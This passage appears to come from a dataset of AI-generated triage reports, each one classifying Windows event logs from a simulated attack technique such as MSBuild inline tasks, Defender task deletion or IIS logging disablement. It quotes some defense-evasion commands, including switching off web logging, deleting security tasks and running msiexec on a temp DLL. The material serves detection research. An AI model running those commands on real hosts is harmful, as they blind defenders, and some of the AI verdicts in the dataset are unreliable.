   - This activity appears benign as it matches typical behavior for an Edge update process.

### Assessment:
- **BENIGN**: The activity related to the Edge update seems normal for a system carrying out regular software updates. 

- **SUSPICIOUS**: The installation of ""file file Test Installer"" via an MSI from a temporary directory, along with the execution of a `.tmp` file is atypical. The vague naming and subsequent execution suggest it could be a custom or even a potentially unwanted application. This should be investigated further to confirm its legitimacy.

### Resolution:
- **SUSPICIOUS**: The logs contain activity that appears suspicious, particularly the installation from a temporary directory with non-standard naming conventions. It is recommended to:
  - Verify the legitimacy of the ""file file Test Installer"" installation.
  - Investigate the content and source of the MSI file and the executed `.tmp` file.
  - Conduct a thorough check on the user account and system for signs of unauthorized access or additional unauthorized software.

Further investigation by examining surrounding logs and obtaining user confirmation could clarify the nature and intention behind the suspicious activities."
Azure - Eventhub Deletion,"Upon analyzing the provided log entries, several pieces of potentially suspicious behavior emerge primarily from the PowerShell logs:

### Suspicious/Anomalous Behavior:
1. **PowerShell Activity**:
   - There are multiple entries of PowerShell command execution using `powershell.exe` with an embedded script. The script attempts to carry out cloud operations:
     - It connects to Azure Active Directory using the `Connect-AzureAD` cmdlet.
     - It attempts to remove an Azure Event hub using the `Remove-AzEventHub` cmdlet.
   - The script employs the `ConvertTo-SecureString` with `-AsPlainText -Force`, which implies using a plaintext password or similar sensitive data in a script, which is against security best practices and can hint towards malicious intent if not authorized.
   - The use of `powershell.exe` is flagged, especially when executed from a path temporal in nature like `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\""`.

2. **Associated Sysmon Events**:
   - The Sysmon logs show the launching of `powershell.exe` from the SYSTEM32 directory, indicating a higher privilege level.
   - It includes command and process execution logs (conhost and other auxiliary processes) typically a part of scripted or automated tasks.

3. **Security and Other System Logs**:
   - There are no relevant security events indicating failed login attempts or privilege escalation attempts.
   - The security log contains a single event (ID 4799) related to a process executed by a Microsoft Edge updater binary, which seems routine and does not directly connect to the suspicious PowerShell activity.

### Malicious Activity or Compromise Indicators:
- The PowerShell activity trying to perform Azure operations in an unsupervised or undocumented manner could be indicative of unauthorized operations by an internal user or via a compromised account.
- Scripts that automate deletion or modification of cloud infrastructure could mean an insider threat or potentially an attacker with gained credentials attempting to disrupt cloud services.

### Assessment and Resolution:
- **Assessment**: The combination of detailed credential manipulation using PowerShell and execution of potentially destructive cloud operations without a definitive backstory or approval stands out as highly suspicious. There is a lack of explicit malicious indicators like malware signatures or privilege escalation, but the activity is dubious.

- **Threat/Risks Identified**:
  - Potential for an insider threat.
  - Risk of external malicious access if the credentials used are compromised.

- **Guidance**:
  - Review the necessity and authorization of the PowerShell script found in the logs.
  - Verify if the user `SERVER002\\admin_test` has legitimate reason to perform such actions; validate recent access and change logs to Azure resources from this account.
  - Alert the cloud and IT administration team to audit for potential effects in the Azure environment (specifically looking at Event Hubs and Active Directory logs).
  - Consider implementing strict access control measures, logging, and service alerts for unusual activities.

**Resolution**: SUSPICIOUS - The activity is concerning and warrants deeper investigation and immediate actions to prevent potential compromise or operational impact."
MSBuild Bypass Using Inline Tasks (C#),"Upon reviewing the Sysmon events in the provided log entries, the following observations and analysis are noted:

1. **Frequent Execution of System Utilities**: There are multiple executions of common system utilities such as `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`. While these tools are legitimate, excessive or unusual usage warrants attention. However, no explicit malicious command-line arguments or abnormal usages are evident in these entries.

2. **PowerShell Execution**: Though there is mention of `powershell.exe` being executed, without additional context such as specific command-line arguments or scripts executed, it is impossible to determine if this is suspicious. It is common for administrators to use PowerShell for legitimate system administration tasks.

3. **Edge Update Activities**: Many events involve `MicrosoftEdgeUpdate.exe` and related processes. These activities align with typical auto-updating behavior for Microsoft Edge. The command-line arguments `/regsvc`, `/regserver`, `/svc`, and `/c` are standard for such updates. There do not appear to be unconventional or unexpected behaviors.

4. **Credential Verification Tools Usage**: The presence of `whoami.exe` suggests potential verification or enumeration of user credentials. In isolation, it isn't indicative of malicious activity, but it's noteworthy if administrators do not typically execute it.

5. **Process Tree for `cmd.exe` and MSBuild**: A suspicious `cmd.exe` execution is invoked to run `msbuild.exe` on a project located in a temporary directory. This project doesn't have context around its legitimacy. However, executing MSBuild in temp locations can be used in ""Living off the Land Binaries"" (LOLbins) techniques for malicious purposes like building malware from source code on the target machine.

6. **Compilation Activities**: The compilation tools like `csc.exe` and `cvtres.exe` are used, aligning with building projects with MSBuild. Again, this aligns with development activities but could also be nefarious if the source in the temp directory is unwanted or unverified.

**Conclusion**:
Given the outlined observations, several elements could imply suspicious activities due to their combination and context. Specific entries related to MSBuild, `cmd.exe`, and their temp directory involvement merit further investigation. Without additional context (such as the content of `data.001.csproj` or detailed behaviors observed around this project), definitive malicious activity cannot be asserted.

**Resolution**: SUSPICIOUS - The logs contain activity that appears out of the ordinary and should be investigated further to determine the legitimacy of these operations, especially regarding the use of MSBuild and cmd.exe with temporary directories. Further checks could involve scrutinizing associated file contents and verifying users' intended activities on the system."
Create ADS PowerShell,"In analyzing the provided logs, I have observed the following:

1. **Application Log**:
   - The log entries from the ""Microsoft-Windows-Security-SPP"" and ""edgeupdate"" do not show any clear signs of malicious activity. The events mainly describe service start and stop actions, which are common in normal operations.

2. **Windows PowerShell Log**:
   - There is a sequence of PowerShell commands that involve the use of `set-content` to create alternate data streams (ADS). Although using PowerShell to manipulate ADS is potentially suspicious, the content being written appears to be benign (simple strings like ""test""). This behavior needs further examination to ensure it is not part of a more complex sequence aiming to bypass detection.

3. **Sysmon Log**:
   - The logs primarily show typical process creations associated with Microsoft Edge Update and standard Windows utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `powerShell.exe` executed by the user ""SERVER002\\admin_test"". The usage of these utilities and applications seems to align with regular system updates and administration tasks.
   - There is no indication of typically malicious processes or unexpected command-line arguments that stand out.

4. **Security Log**:
   - The entries primarily reflect standard logon events for the SYSTEM account. Privilege assignment events are seen, but these are typical for the SYSTEM account in routine operations.
   - Event 4798, related to enumerating the members of a group, could be normal user or script activity but should be checked for legitimacy concerning the operational context.

**Assessment and Resolution**:
- **Assessment**: While there are instances of PowerShell being used to manipulate alternate data streams, which can be a sign of evading detection, there is no irrefutable evidence of malicious activity or obfuscation attempts based on the content reviewed. All processes observed are typically associated with standard administrative activities and service updates.
- **Resolution**: Given the current analysis, the overall activity observed is categorized as **SUSPICIOUS**. The PowerShell activities, however benign they appear, warrant further investigation to confirm their purpose and ensure they do not form part of a broader obfuscated attack or unauthorized script.

**Guidance on How to Proceed**:
1. **Verify Intentions**: Confirm the legitimacy of the PowerShell scripts concerning their origin and purpose. Determine if they are part of a scheduled task or a legitimate administrative script.
2. **Check for Context**: Ensure that the use of administrative utilities aligns with expected system administration practices for this environment.
3. **Monitor Activity**: Continue to monitor the host for any additional unexpected activities or further use of PowerShell and ADS that may indicate malicious intent.

Further steps may include reaching out to the personnel responsible for maintaining the system for confirmation of these activities or deploying endpoint detection solutions to monitor and block potential threats in real-time."
Invoke CHM Simulate Double click,"Upon reviewing the provided Windows event logs, the following points of interest and anomalies are identified:

1. **PowerShell Execution**:
   - Several instances of PowerShell execution are noticeable. EventID 1 captures multiple PowerShell instances, such as:
     - `""powershell.exe"" & {Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm}`: This command invokes a help file, potentially a CHM (Compiled HTML Help) file, and could be used for legitimate purposes or in a phishing attack if the CHM contains malicious payloads.
     - `powershell.exe -ExecutionPolicy Restricted -Command ...`: Despite the restricted execution policy, the suspicious command pattern involving multiple PowerShell invocations is concerning.

2. **Parent Process**:
   - PowerShell instances are being launched with `wsmprovhost.exe` as the parent process. `wsmprovhost.exe` is a legitimate Windows service involved in Windows Remote Management (WinRM), but misuse of this process could indicate a potential lateral movement activity or remote administration task that might be worth investigating further.

3. **Unusual Process Activity**:
   - The frequent launching of `wevtutil.exe` and `conhost.exe` could be normal within certain environments, but if unauthorized, it could indicate attempts to manipulate event logs, perhaps to delete or alter logs to cover tracks.
   - The usage of `whoami.exe` and `hostname.exe` seems benign, as they generally serve to identify user and machine information.

4. **System Events**:
   - Regular Windows updates are logged, which appear standard and part of regular system operations; however, they should be cross-checked against the organization's patch management schedule.

5. **Command Line Anomalies**:
   - The commands within PowerShell sessions and their contexts should be validated to ensure they align with expected administrative tasks. If there is suspicion that these commands are exploited for malicious purposes (e.g., privilege escalation, lateral movement), further scrutiny of these sessions is necessary.

Given these observations, the events contain elements that require further investigation:

- **Recommendation**: Perform a detailed investigation into the origins and contexts of the PowerShell scripts executed, specifically those with potentially suspicious command lines. Validate which user, if any, initiated these commands and if these align with typical administrative behavior.
- **Resolution**: SUSPICIOUS. The logs contain activities (PowerShell executions) that do not definitively confirm malicious activity but do require further analysis to rule out potential compromise. The presence of legitimate processes performing atypical tasks under particular contexts warrants this classification."
Delete an entire folder - Windows PowerShell,"Upon reviewing the provided logs, several points are noteworthy:

1. **Microsoft Edge Update Activity**: 
   - Numerous events relate to Microsoft Edge Update processes, which typically involve executable files such as `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and so forth. These processes are consistently running under `NT AUTHORITY\SYSTEM`, which indicates system-level operations likely tied to legitimate update activities. The command lines used and file hashes observed are consistent with those used by legitimate Microsoft Edge update mechanisms. 

2. **PowerShell Activity**:
   - There is a PowerShell execution (`Remove-Item`) noted with the command `powershell.exe & {Remove-Item -Path $env:TEMP\\deleteme_folder_data.004 -Recurse}`. While administrative users like the `SERVER002\admin_test` user have the capability to run scripts like this, context matters. Since this command is targeting the TEMP directory, it could be legitimate cleanup activity, but should be verified as it can potentially be used as a cover for deleting evidence.

3. **Utility Executions (e.g., `whoami.exe` and `hostname.exe`)**:
   - The execution of utilities such as `whoami.exe` and `hostname.exe` in a sequence where attributes like high integrity level and same parent process are observed could signify routine administrative tasks or monitoring operations. However, if these processes occur in unusual contexts or with unexpected frequency, they might imply enumeration steps within an attack.

4. **Frequent Use of `conhost.exe`**:
   - The repeated invocation of `conhost.exe`, linked to console management, follows legitimate processes like `whoami.exe` and `powershell.exe`. However, if observed in conjunction with abnormal processes, it could indicate process injection or console manipulation attempts.

5. **Sysmon Logs Consistency**:
   - Process creation and termination logs show consistent activity related to the Microsoft update process, with no significant divergence from expected patterns, file versions, or execution users. The Microsoft Edge Update processes also correlate with `Microsoft-Windows-Security-SPP` logs, showcasing platform service interactions that are common in legitimate update cycles.

### Assessment:
- **Suspicious Finding**: While most activities are linked to system updates and administrative tasks, the PowerShell activity should be noted and verified due to its potential misuse in advanced persistent threats (APTs) or post-exploitation activities.
- **Primary Concerns**: 
  - Verify the context and need for the PowerShell command as it could delete critical data if not legitimate.
 
### Resolution: **SUSPICIOUS**
Given the context, while the majority of the logged activities are benign and relate to legitimate system functions, the specific PowerShell action should be further inspected to rule out misuse or system compromise within an administrator's logged session. Therefore, further investigation is warranted to ensure the action aligns with known administrative tasks and is not indicative of unauthorized operations."
Read volume boot sector via DOS device path (PowerShell),"Upon reviewing the provided logs, the following analysis has been conducted for each log category:

### System Log:
- The logs primarily indicate updates related to Windows Defender Antivirus (`KB2267602`), and system update processes. There are no indications of failed updates or attempts to modify critical system files.
- Each event, such as Event ID 19, relates to successful updates of security signatures, which are expected routine updates for system security enhancement.

### Application Log:
- The ""edgeupdate"" log entry indicates a normal service stop event related to the Microsoft Edge Update process, which is common post-update or during system maintenance. 
- The ""SecurityCenter"" log reflects that Windows Defender is operational, which provides a reassurance of active antivirus protection.

### Security Log:
- Multiple occurrences of Event ID 5379, correlated with an unsuccessful credential retrieval due to the `ReturnCode` value `3221226021` (meaning `C000006D`, STATUS_LOGON_FAILURE). This typically indicates failed login attempts related to credential management but does not denote successful unauthorized access or breach.

### Windows PowerShell Log:
- PowerShell logs capture command execution; notably, there is an execution of potentially anomalous command-line activity involving `FileStream` operations on a Windows device `\\.\C:`. This PowerShell execution might indicate attempts at reading sensitive data directly from system drive sectors, which is not typical for benign scheduled tasks or administrative operations.

### Sysmon Log:
- Sysmon captures reflect normal process activity for system maintenance, including processes like `wevtutil.exe`, `conhost.exe`, and `WmiPrvSE.exe`. However, `powershell.exe` usage in combination with direct disk reading through PowerShell suggests the potential for data exfiltration or unauthorized data access attempts.
- There is frequent usage of administrative credentials `SERVER002\admin_test`, which should be verified against expected administrative activity to ensure that this activity aligns with scheduled or approved actions.
- Various instances of Microsoft Edge Update processes and Windows Update Client processes running under `NT AUTHORITY\SYSTEM` are expected during normal system updates.

### Assessment:
The logs do highlight some potentially suspicious activities:
- The PowerShell command using direct disk reading techniques could signal malicious attempts to access or manipulate the file system outside normal administrative usage, warranting further investigation.
- An emphasis should be placed on verifying whether administrative processes align with routine activities, considering the frequency of admin-level process executions present in the logs, especially `SERVER002\admin_test`.

### Guidance:
1. Further verify the legitimacy of the PowerShell script observed (`$buffer = New-Object byte[] 11...`) and its origin.
2. Confirm the system's security patch level and the integrity of antivirus definitions to ensure no exploitation is possible through the observed PowerShell activity.
3. Review login attempts and administrative access patterns during the period in question to ascertain whether they match standard operational procedures.

**Resolution: SUSPICIOUS**
- The discovery of potentially anomalous PowerShell activity leads to the conclusion that this requires further investigation to determine if this is benign experimentation or a precursor to malicious activities."
Delete Windows Defender Scheduled Tasks,"Upon examining the log entries provided, several observations and analyses can be made:

### Key Observations:

1. **Time Anomaly in System and Security Logs**:
   - The logs indicate an unusual time manipulation:
     - `EventID 1`: The system time was changed multiple times by `svchost.exe`. 
     - `EventID 4616`: Security log also notes these time changes.
   - The `OldTime` and `NewTime` entries show time reverting back to 10:00:22 from a later timestamp. This is suspicious as consistent time changes can potentially be linked to tampering efforts to alter log timelines.

2. **Frequent Task Scheduler Activities**:
   - The Sysmon logs show extensive usage of task scheduler commands (`schtasks`) related to querying and deleting tasks ostensibly related to Windows Defender:
     - Querying tasks using XML output, which can be legitimate but is suspicious when coupled with time changes and the subsequent deletion of tasks.
     - Deleting tasks (cleanup, cache maintenance, verification, scheduled scan) without apparent context indicating intentional task elimination.
   - Command-line activities related to `cmd.exe` and `schtasks.exe` involve documenting and then deleting Defender tasks, indicating potential attempts to remove security rules or jobs.

3. **Use of `wevtutil`**:
   - There are multiple instances of using `wevtutil.exe`, which can be used to query or modify event logs and is a known tool for attackers to clear logs.

4. **Process Execution**:
   - `HOSTNAME.exe` and `whoami.exe` executions appear in Sysmon logs, which are generally harmless but given the context, could be part of a broader enumeration or system information gathering process often used by attackers post-compromise.
   
5. **Integrity Levels and User Context**:
   - All suspicious activities occur under a high integrity level and are associated with a user `SERVER002\\admin_test`, suggesting elevated privileges which could be a result of privilege escalation.
   
### Assessment of Findings:

- **Time Manipulation**: Indicative of attempts to mask or reorder events to hide unauthorized or malicious activity.
- **Task Scheduler and Event Manipulations**: Suggest actions to tamper with system security configurations (task removal) and logs (querying and potential log destruction).
- **Enumeration Processes**: Seem to be indicative of system reconnaissance activities.

### Conclusion:

Based on the evidence and suspicious patterns such as time manipulation, task manipulation, and potential log tampering, these activities appear to demonstrate signs of system tampering and potential compromise. These hints at a possible breach or malicious activities warrant further investigation and remediation.

### Resolution: **MALICIOUS**

### Recommended Actions:
1. **Immediate Investigation**:
   - Examine the user account `SERVER002\\admin_test` for unauthorized actions or recent changes.
   - Reset system clock to prevent further manipulation and ascertain the source of changes.

2. **Containment and Eradication**:
   - Revert unauthorized task deletions or ensure critical security tasks are restored.
   - Use endpoint detection tools to further investigate processes initiated by `admin_test`.

3. **Audit Logs**:
   - Review event logs and apply security monitoring to detect the recurrence of similar activities.
   - Increase logging verbosity and retention to capture future anomalies.

4. **Security Hardening**:
   - Apply strict auditing rules, especially around the use of task schedulers and usage of administrative tools like `wevtutil`.

These actions aim to arrest and investigate suspected compromise, ensuring system integrity and security."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"Upon reviewing the provided Windows event logs, several observations are made, and I will highlight suspicious and potentially malicious activities:

### Observations:
1. **EdgeUpdate Service Stopped (Application Log):**
   - The application log shows multiple entries of the ""edgeupdate"" service stopped:
     - `EventID: 0`, Occurred twice at the same time.
   - This could indicate normal activity or a crashing/stopping of the Microsoft Edge update. Frequent stops are worth noting, especially if there are no corresponding start events shortly thereafter.

2. **PowerShell Execution:**
   - There are no logs provided in the PowerShell log section. Incomplete logs could be suspicious if PowerShell activity is typically tracked but now missing.

3. **Sysmon Logs Observations:**
   - **Suspicious Command Execution:**
     - An instance of `cmd.exe` running with `msiexec.exe /z` on a DLL in a temp directory:
       - `CommandLine: ""cmd.exe"" /c c:\windows\system32\msiexec.exe /z ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\MSIRunner.dll""`
       - The execution of `msiexec.exe` with a non-standard flag `/z` and running a DLL from a temporary directory is often linked to attempts of software exploitation or malicious software execution.
   - **Conhost.exe Consistency:**
     - Frequent spawning of `conhost.exe` accompanying processes like `cmd.exe`, `powershell.exe`, etc., can occasionally indicate process hiding or execution of scripts.
   - **Frequent Edge Update Executions:**
     - The execution of Microsoft Edge Updater (`MicrosoftEdgeUpdate.exe`) in different modes (`/svc`, `/update`, `/regsvc`, `/regserver`) and the launching from a `Temp` folder can be routine but requires validation to ensure its benign as these processes being executed by `NT AUTHORITY\SYSTEM` indicates high privileges, potentially dangerous if those are not standard updates.

### Assessment:
From the data analysis:
- The execution of `msiexec.exe` with a particular command to load a DLL from a temp directory might be the strongest indicator of potentially malicious behavior. The same could be used for DLL sideloading attacks used by attackers to execute malicious payloads under legitimate process names.
- Regular entries of Edge Updates are observed. As these entries are shown across different directories, further verification if these updates align with regular update behavior is necessary.

### Resolution:
**SUSPICIOUS** - The entries regarding `msiexec.exe` execution are concerning and bear closer inspection, especially regarding the intent behind DLL execution from a temporary directory. Similarly, frequent service stops for `edgeupdate` and frequent high-privilege executions warrant further scrutiny to rule out any potential compromise or unauthorized activities.

### Recommendations:
- **Investigate the Temp Directory**: Validate the legitimacy of `data.007\bin\MSIRunner.dll` execution. If it is not an expected component, this must be analyzed for malicious content.
- **Review Update Policies**: Verify if the behavior of `MicrosoftEdgeUpdate.exe` aligns with the company’s update policy and frequency.
- **Investigate Missing Logs**: Determine if there’s suppression or removal of PowerShell logs which could indicate script-based attacks hidden from monitoring.
- **Continuously Monitor**: Implement checks for high frequency of process terminations, executions from temp folders, or user profile directories.
- **Further Threat Hunt**: Expand investigation criteria for any further anomalous activities in these time frames, such as network connections, unsigned executable launches, etc."
Allow Simultaneous Download Registry,"### Analysis of Logs:

**Sysmon Log Analysis:**
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\\admin_test`. 
   - These processes execute frequently within a very short time frame. `wevtutil.exe` can be used for reading and writing event logs and is often leveraged by attackers to clear event logs; however, there is no indication of such activity here.
   - `conhost.exe` is a legitimate Windows process, typically associated with console windows.

2. **Execution of `cmd.exe` with Registry Modifications**:
   - The event logs indicate `cmd.exe` is executing commands to modify registry settings, specifically related to `Internet Settings`'s `MaxConnectionsPerServer` and `MaxConnectionsPer1_0Server`. This is done by user `admin_test`.
   - While registry modifications can be part of legitimate configurations, changes in these specific settings might hint at performance tuning or possibly preparing system networking behavior, which might be indicative of a setup for downloading or connectivity scenarios not typically visible.

3. **Presence of `whoami.exe` and `hostname.exe` Execution**:
   - The logs show execution of `whoami.exe` and `hostname.exe`, which are standard utilities for identifying user and host information. They are often used in legitimate scripts but can also be used by attackers for reconnaissance on compromised systems.

4. **Execution of `svchost.exe`, `sppsvc.exe`, and `TiWorker.exe`**:
   - These processes (`svchost.exe`, `sppsvc.exe`, and `TiWorker.exe`) and `TrustedInstaller.exe` are legitimate Windows processes operating under SYSTEM or NETWORK SERVICE accounts. No evident malicious behavior is associated with these entries.

5. **MicrosoftEdgeUpdate.exe Execution**:
   - The execution of `MicrosoftEdgeUpdate.exe` hints towards a routine update process. This is typically benign unless there are known vulnerabilities being exploited, which is not indicated here.

**Potential Indicators of Compromise:**
- **High Privilege**: All actions are performed with a high integrity level by an administrative user, which would be a primary concern for potential escalations or misuse if compromised.
- **Registry Manipulation**: The use of command-line to alter registry, especially related to network configurations, could hint at suspicious activity if there is no legitimate explanation for these changes.

**General Assessment:**
- The logs reflect a series of administrative commands being executed, which involve querying user information, executing utilities like `whoami` and `hostname`, and performing registry edits.
- The execution pattern and particular use of `cmd.exe` to manipulate network-related registry entries suggest a scenario worth further investigation to verify the legitimacy of these actions.

### Conclusion:
- **Resolution: SUSPICIOUS**

**Recommendation:**
- Validate the activity with the user `admin_test` to check if these actions were legitimate and authorized.
- Investigate the need for registry modifications — determine if this is part of routine administration or if it was unauthorized. Monitor network traffic for unusual patterns.
- Conduct a thorough review of system policies regarding command execution and registry changes to prevent abuse of administrative privileges.
- Assess if any additional security monitoring or preventive measures can be enhanced to better detect potential misuse of privileged accounts."
Disable Windows IIS HTTP Logging via PowerShell,"Upon reviewing the provided logs, there are several elements worth addressing:

1. **Edge Update Service Stopped**:
    - The application log shows multiple ""edgeupdate"" service stopped messages in quick succession. This might be typical for scheduled updates or restarts of services, especially apparent when processes related to application updates (like Edge Update) are being initiated and managed. While it isn't inherently malicious, it can warrant monitoring for repetitive failure reasons or unauthorized changes.

2. **Time Change Events**:
    - The security and system logs indicate time change events (Event ID 4616 in the security log and Event ID 1 in the system log) on `Server002`. Time changes can be legitimate, often tied to time synchronization services, but it's crucial to ascertain whether they match expected behavior or authorized changes.
    
3. **PowerShell Activity**:
    - A sequence involving PowerShell indicates the execution of `set-WebConfigurationProperty` to modify IIS logging configuration. This task appears in the Windows PowerShell log:
      - `""set-WebConfigurationProperty -PSPath ""IIS:\Sites\Default Web Site"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true""`. 
      - Such PowerShell commands could be used to suppress web server logs, which is a suspicious activity often associated with malicious intent to cover tracks after unauthorized access or modifications. It implies someone with administrative rights made a configurational change to IIS.

4. **Sysmon Logs Insight**:
    - Sysmon logs do not reveal explicit malicious binaries or unusually named processes, predominantly showing system processes and Edge updates. However, the inclusion of PowerShell in the logged processes matches the previous observations about IIS configuration change.

5. **High Integrity Level Processes**:
    - Many processes, especially PowerShell, seem to run at high integrity levels indicative of administrative privileges. This isn't suspicious on its own but coupled with specific PowerShell command usage, it could signify unauthorized administrative actions.

Based upon the analysis:

- **Assessment**: While the logs do not clearly exhibit definitive evidence of a fully compromised system, the usage of PowerShell to disable web server logging is highly unusual and could signify malicious intent, particularly if not corroborated with a legitimate administrative task or change management request. This specific action shows a cautionary indicator of potential attempts to obfuscate other activities.
  
- **Resolution**: **SUSPICIOUS** - Activity within the logs includes potentially risky PowerShell operations which could align with malicious behavior if performed without authorization. Further investigation is advised:
  - Confirm whether the PowerShell activity matches with known and approved configuration changes.
  - Ensure all involved accounts have legitimate background checks and that none have been compromised or repurposed.
  - Cross-reference other logs (e.g., IIS server logs, authentication attempts, network firewalls) for related activities or anomalies.

It would be prudent to monitor these systems closely, possibly increasing logging verbosity, and ensure all actions are compliant with organizational IT policies."
Enforce Smart Card Authentication Through Registry,"Upon reviewing the provided event logs from the Windows host, there are several notable points that may indicate potential malicious or suspicious behavior:

1. **Microsoft Edge Update Execution from Temp Directory:**
   - Sysmon log entries show that `MicrosoftEdgeUpdate.exe` was executed from a temporary directory `C:\\Program Files (x86)\\Microsoft\\Temp\\EU4B09.tmp\\MicrosoftEdgeUpdate.exe`.
   - It is unusual for a legitimate update task to execute from a temporary directory, as they typically run from the installation directory. This could indicate tampering or a trojanized executable.

2. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - Several events show `wevtutil.exe` and `conhost.exe` running in quick succession by the user `SERVER002\\admin_test`.
   - While `wevtutil.exe` is a legitimate tool for managing event logs, frequent and clustered execution could be indicative of an attempt to manipulate or exfiltrate event log data.

3. **Registry Modification Attempt:**
   - The execution of `cmd.exe` with parameters to add or modify a registry entry: `reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" /v scforceoption /t REG_DWORD /d 1 /f`.
   - Such registry changes, especially around policy settings, can potentially be used for privilege escalation or persistence mechanisms by attackers.

4. **Time Change:**
   - There is a notable event where the system time was manually adjusted backward, as seen in the Kernel General and Security logs.
   - Unauthorized time changes could be used to evade log analysis, by affecting timestamps and making correlation of events more difficult.

5. **Integrity Level and Privilege:**
   - Some of the processes executed with high integrity levels, indicative of administrative privileges.
   - The user `SERVER002\\admin_test` seems involved in several of these activities, indicating either an insider threat scenario or compromised credentials with administrative access.

**Resolution: SUSPICIOUS**

Based on the analysis, the activities in the logs suggest a SUSPICIOUS resolution. The behavior seen in these logs warrants further investigation to confirm or rule out malicious intent. Specifically, you should:

- Verify the authenticity and integrity of `MicrosoftEdgeUpdate.exe` found in the temp directory.
- Investigate the intent behind the `wevtutil.exe` executions.
- Review any changes made to registry settings, especially those configured via the suspicious command-line entries.
- Determine who initiated the unauthorized time change and the purpose behind it.
- Monitor `SERVER002\\admin_test` account usage and ensure that it is not compromised.

To proceed, consider engaging with Digital Forensics and Incident Response (DFIR) to perform a deeper analysis of the affected system and network to gather additional context, and possibly identify indicators of compromise (IOCs)."
Decompile Local CHM File,"**Detailed Analysis of the Logs:**

**1. Process Execution:**
   - The logs show numerous process executions on Server002, primarily involving `powershell.exe`, `wevtutil.exe`, and `conhost.exe` processes under the `admin_test` user context.
   - Notably, multiple `wevtutil.exe` executions could be a point of concern, as this utility is used to manage Windows Event logs and could indicate log tampering if misused maliciously.

**2. Command-Line Arguments:**
   - Processes like `cmd.exe` executed with the command line to decompile HTML help files (`hh.exe -decompile`), which is somewhat unusual but not definitively malicious. This might suggest some file checks or manipulations, potentially for troubleshooting or setup tasks.

**3. Privilege Levels and User Accounts:**
   - Most processes executed with “High” integrity level and under the `admin_test` user. This suggests administrative-level actions.
   - The EdgeUpdate processes were executed under `NT AUTHORITY\SYSTEM`, indicating legitimate background update processes.

**4. Noteworthy Patterns or Behavior:**
   - The frequent execution of `MicrosoftEdgeUpdate.exe` and related components at a system-level aligns with routine update processes for Microsoft Edge.
   - A pattern of sequential process creations involving standard system tools (e.g., `hostname.exe`, `whoami.exe`, `cmd.exe`) and Edge Update components seems consistent with routine operations.
   - The simultaneous execution of various console hosts and system utilities suggests regular administrative activities rather than suspicious behavior.

**5. Application and System Logs:**
   - Application logs show events indicative of security checks (e.g., Windows Defender staying enabled and operational) and benign service states (edge update).
   - No unusual system-level events or security violations were observed in available logs, suggesting the system is functioning normally.

**6. Absence of Directly Malicious Indicators:**
   - There is no clear evidence of known malicious signatures, such as typical malware-related processes or rogue execution paths, nefarious command lines, or privilege escalation attempts.
   - The activities logged are routine and could be associated with system maintenance, software updates, or other legitimate administrative tasks.

**Assessment:**
Based on the collected data, the activities observed in the logs do not show any clear evidence of compromise or malicious behavior. The executions and command lines observed, while consistently administrative and quite abundant, do not demonstrate anomalies or deviations typically linked to security threats.

**Resolution: BENIGN**
Given the detailed analysis, the activities noted in the log entries appear to be normal system processes and updates. There are no direct indicators to suggest malicious activities. My recommendation is to continuously monitor the system but classify these specific logs as BENIGN. No immediate action is necessary beyond routine supervisory vigilance."
Setting Shadow key in Registry for RDP Shadowing,"Upon reviewing the logs provided, several elements indicate potential suspicious activity that warrants further investigation. Here is a detailed analysis of key points that stand out:

1. **Security Log Analysis**:
   - **Event ID 4672**: A logon session with special privileges was established for the user `admin_test`. The privileges include `SeDebugPrivilege`, which allows a process to debug and modify other processes, indicative of potential attempts to escalate privileges or manipulate system processes.
   
2. **Sysmon Log Analysis**:
   - **Command Execution**: We observe frequent execution of `wevtutil.exe`, `conhost.exe`, and `hostname.exe` by the user `admin_test`. While these executables are legitimate Windows utilities, their use in rapid succession, especially without a clearly logged purpose, may suggest they were scripted to perform specific administrative or system query functions in an unusual or automated manner.
   - **PowerShell Command**: A Powershell script is executed that modifies registry keys and firewall settings (via invocation of `Get-CimInstance` and `Invoke-CimMethod` to enable a rule named ""Remote Desktop - Shadow (TCP-In)""). This can be seen as an attempt to configure the system for unauthorized remote access or shadowing, which is often a red flag in terms of system compromise.
   
3. **Application & Windows PowerShell Log Analysis**:
   - The PowerShell logs corroborate the Sysmon logs showing the use of a potentially malicious script to modify important system configurations.
   - The Edge Update service was stopped, as logged in the Application log, although this alone may not be inherently malicious, it coincides with the scripting activity and could suggest an effort to modify system update behavior.

4. **Assessment**:
   - The combination of privileged access, rapid execution of system utilities, direct manipulation of critical system settings via PowerShell, and shutdown of an update service, all conducted within a tight timeframe, points to either a legitimate but undocumented administrative activity or a potential compromise attempting to maintain persistence or prepare for lateral movement within the network.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Actions**:
   - Isolate `Server002` from the network to prevent any further potential unauthorized access or data exfiltration.
   - Conduct immediate user activity review for `admin_test` to understand if these actions were sanctioned or part of a project.
   - Contact the user or the responsible administrator to check for any legitimate actions that were expected to run at this time.

2. **Further Investigation**:
   - Review additional context around these events, such as network traffic logs or endpoint detection logs, to see if there were any unauthorized external connections.
   - Perform a detailed review of scripts executed via PowerShell, especially those involving registry and firewall changes.
   - Check for any related alerts in your SIEM or other security solutions that might provide more details about this suspicious activity.

3. **Mitigation and Hardening**:
   - Audit and possibly tighten the privileges associated with users who can execute high-privilege operations.
   - Increase logging and monitoring of administrative activities on `Server002`.
   - Investigate and apply security patches or updates that may address vulnerabilities related to these activities.

Ensure to document all investigative actions and findings for future reference and potentially an incident report if required. This situation warrants a cautious approach until benign justifications are confirmed."
UAC Bypass with WSReset Registry Modification,"Upon thorough examination of the provided Windows event logs, several entries indicate potential suspicious activity that should be investigated further:

### Analysis:

1. **PowerShell Activity:**
